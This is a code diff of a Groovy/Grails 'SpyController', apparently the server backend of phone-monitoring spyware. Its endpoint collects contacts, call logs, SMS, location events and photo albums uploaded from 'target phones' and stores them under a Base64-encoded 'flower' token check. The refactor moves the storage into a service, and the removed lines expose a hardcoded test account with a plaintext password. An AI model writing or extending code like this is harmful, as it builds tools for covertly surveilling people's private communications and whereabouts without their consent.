@@ -2,194 +2,106 @@ package com.xaviar
 
 import static org.springframework.web.bind.annotation.RequestMethod.POST
 
+import org.apache.commons.codec.binary.Base64
 import org.codehaus.jackson.JsonParseException
 import org.codehaus.jackson.map.JsonMappingException
-import org.codehaus.jackson.map.ObjectMapper
-import org.codehaus.jackson.type.TypeReference
 
 import redis.clients.jedis.Jedis
 
-import com.org.krams.domain.UMetaData
-import com.xaviar.domain.CallLog
-import com.xaviar.domain.Contact
-import com.xaviar.domain.FileData;
-import com.xaviar.domain.Location
-import com.xaviar.domain.PhoneParams
-import com.xaviar.domain.Sms
 import com.xaviar.domain.TargetPhone
 import com.xaviar.domain.User
 import com.xaviar.market.rest.item.DataHolder
 
+
+//main class for retrieving target phons data
 class SpyController {
 
-	def redisService
-//	def contactService
-//	def locationService
-//	def smsService
-	def userService
-//	def callLogService
-//	def phoneEventService
-//	def smsEventService
-//	def phoneParamsService
+	def redisService;
+	def spyAuthService;
+	def targetPhoneService
 
+	//get data from target phones and add it to the DB
 	def createdata(DataHolder dataHolder) {
 
-		userService.initDammyUsers();
+		try{
+			//get flower data for auth and target
+			String clientFlower = dataHolder.get(DataHolder.FLOWER);
 
-		// new user
-		//dataHolder.data = '{"username":"username123","password":"password123","simSubscriberId":"3453453444"}';
+			// validate clientFlower data exists
+			if(clientFlower!=null && !clientFlower.isEmpty()){
 
-		// old user
-		dataHolder.data = '{"token":"token123","simSubscriberId":"425071021121744"}';
+				// decode flower data before use
+				clientFlower = new String(Base64.decodeBase64(clientFlower.getBytes()));
 
-		String clientContacts = dataHolder.get(DataHolder.CONTACTS);
-		String clientLocation = dataHolder.get(DataHolder.LOCATION);
-		String clientSms = dataHolder.get(DataHolder.SMS);
-		String clientCallLog = dataHolder.get(DataHolder.CALL_LOG);
-		String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
-		String clientPhoneParams = dataHolder.get(DataHolder.PHONE_PARAMS);
-		String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);
-		String clientPics = dataHolder.get(DataHolder.BIN_ZIP_PICTURES);
+				//auth user
+				if(spyAuthService.authTargetRequest(clientFlower)){ //user is authenticated
 
-		if (dataHolder.data != null) {
+					//auth data
+					String authSimSubscriberId = spyAuthService.getSimSubscriberId(clientFlower);
+					User authUser =  spyAuthService.getUser(clientFlower);
 
-			Iterator<Map.Entry<String, String>> iterator = dataHolder.map.entrySet().iterator();
-			while (iterator.hasNext()) {
-				Map.Entry<String, String> mapEntry = (Map.Entry<String, String>) iterator
-						.next();
-				Jedis jedis = new Jedis("localhost");
-				jedis.set("GENERIC_" + mapEntry.getKey().toString(), mapEntry.getValue()
-						.toString());
-			}
+					//Redis testing data
+					//addAllToRedis(dataHolder)
 
-			try {
-				ObjectMapper mapper = new ObjectMapper();
-				UMetaData uMetaData = mapper.readValue(dataHolder.data,UMetaData.class);
+					TargetPhone targetPhone = TargetPhone.findBySimSubscriberId(authSimSubscriberId);
 
-				if(userService.authenticateUser(uMetaData)){
-					if (clientPhoneParams != null) {
-						mapper = new ObjectMapper();
-						List<PhoneParams> phoneParams = mapper.readValue(clientPhoneParams,new TypeReference<List<PhoneParams>>() {
-								});
-						//PhoneParams.saveAll(phoneParams);
-						//phoneParamsService.createAll(phoneParams,uMetaData);
+					//target phone parameters
+					targetPhoneService.addPhoneParams(dataHolder, authSimSubscriberId,authUser)
 
-						List<TargetPhone> targetPhones = mapper.readValue(clientPhoneParams,new TypeReference<List<TargetPhone>>() {
-								});
+					//target phone contacts
+					targetPhoneService.addContacts(dataHolder, targetPhone)
 
-						User user = new User();
-						user.setUsername("eitan2007@gmail.com");
-						user.setPassword("567567");
-						user.setFirstName("eitan");
-						user.setLastName("baron");
-						user.version=1;
-						user.save();
+					//target phone call logs
+					targetPhoneService.addCallLogs(dataHolder, targetPhone)
 
-						def existingUser = User.findByUsernameAndPassword("eitan2007@gmail.com","567567");
-						//TargetPhone.saveAll(phoneParams);
-						//TargetPhone.findBy (user).saveAll(phoneParams);
-						targetPhones.each{
-							it.user=existingUser;
-							it.save();
-						}
+					//target phone call log events
+					targetPhoneService.addCallLogEvents(dataHolder, targetPhone)
 
-					}
+					//target phone location events
+					targetPhoneService.addLocationEvents(dataHolder, targetPhone)
 
+					//target phone smses
+					targetPhoneService.addSmses(dataHolder, targetPhone)
 
-					TargetPhone  targetPhone = TargetPhone.findBySimSubscriberId(uMetaData.getSimSubscriberId());
+					//target phone sms events
+					targetPhoneService.addSmsEvents(dataHolder, targetPhone)
 
-					if (clientContacts != null) {
-						mapper = new ObjectMapper();
-						List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
-								});
-						contacts.each{
-							it.targetPhone=targetPhone;
-							it.save();
-						}
+					//target phone album pictures
+					targetPhoneService.addPictures(dataHolder, targetPhone)
 
-						//Contact.saveAll(contacts);
-						//contactService.createAll(contacts,uMetaData);
-					}
-
-					if (clientCallLog != null) {
-						mapper = new ObjectMapper();
-						List<CallLog> callLogs = mapper.readValue(clientCallLog,new TypeReference<List<CallLog>>() {
-								});
-
-						callLogs.each{ it.targetPhone=targetPhone;	it.save();						 }
-						//CallLog.saveAll(callLogs);
-						//callLogService.createAll(callLogs,uMetaData);
-					}
-
-					if (clientPhoneEvent != null) {
-						mapper = new ObjectMapper();
-						List<CallLog> phoneEvents = mapper.readValue(clientPhoneEvent,new TypeReference<List<CallLog>>() {
-								});
-						phoneEvents.each{ it.targetPhone=targetPhone;it.save(); }
-
-						//CallLog.saveAll(phoneEvents);
-						//phoneEventService.createAll(phoneEvents,uMetaData);
-					}
-
-					if (clientLocation != null) {
-						mapper = new ObjectMapper();
-						List<Location> locations = mapper.readValue(clientLocation,new TypeReference<List<Location>>() {
-								});
-						locations.each{ it.targetPhone=targetPhone; it.save();}
-						//Location.saveAll(locations);
-						//locationService.createAll(locations,uMetaData);
-					}
-
-					if (clientSms != null) {
-						mapper = new ObjectMapper();
-						List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
-								});
-
-						smses.each{
-							it.targetPhone=targetPhone;
-							it.save();
-						}
-						//Sms.saveAll(smses);
-						//smsService.createAll(smses,uMetaData);
-					}
-
-					if (clientSmsEvent != null) {
-						mapper = new ObjectMapper();
-						List<Sms> smsEvents = mapper.readValue(clientSmsEvent,new TypeReference<List<Sms>>() {
-								});
-						smsEvents.each{ it.targetPhone=targetPhone;it.save(); }
-						//Sms.saveAll(smsEvents);
-						//smsEventService.createAll(smsEvents,uMetaData);
-					}
-					
-					
-					if (clientPics != null) {
-						mapper = new ObjectMapper();
-						List<FileData> clientPictures = mapper.readValue(clientPics,new TypeReference<List<FileData>>() {
-								});
-						clientPictures.each{it.save();}
-						//Sms.saveAll(smsEvents);
-						//smsEventService.createAll(smsEvents,uMetaData);
-					}
-
+					//send ok message to phone
+					dataHolder.setID(200);
+					[dataHolder:dataHolder]
 				}
-
-				final int id = 12;
-				dataHolder.setID(id);
-
-				[dataHolder:dataHolder]
-			} catch (JsonParseException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			} catch (JsonMappingException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
 			}
+		} catch (JsonParseException e) {
+			e.printStackTrace();
+			return new DataHolder().setID(-2);
+		} catch (JsonMappingException e) {
+			e.printStackTrace();
+			return new DataHolder().setID(-3);
+		} catch (IOException e) {
+			e.printStackTrace();
+			return new DataHolder().setID(-4);
+		}catch(Exception e){
+			e.printStackTrace();
+			return new DataHolder().setID(-1);
+		}finally{
+
 		}
 	}
+
+	private addAllToRedis(DataHolder dataHolder) {
+		Iterator<Map.Entry<String, String>> iterator = dataHolder.map.entrySet().iterator();
+		while (iterator.hasNext()) {
+			Map.Entry<String, String> mapEntry = (Map.Entry<String, String>) iterator
+					.next();
+			Jedis jedis = new Jedis("localhost");
+			jedis.set("GENERIC_" + mapEntry.getKey().toString(), mapEntry.getValue()
+					.toString());
+		}
+	}
+
 
 	def getdata ={
 
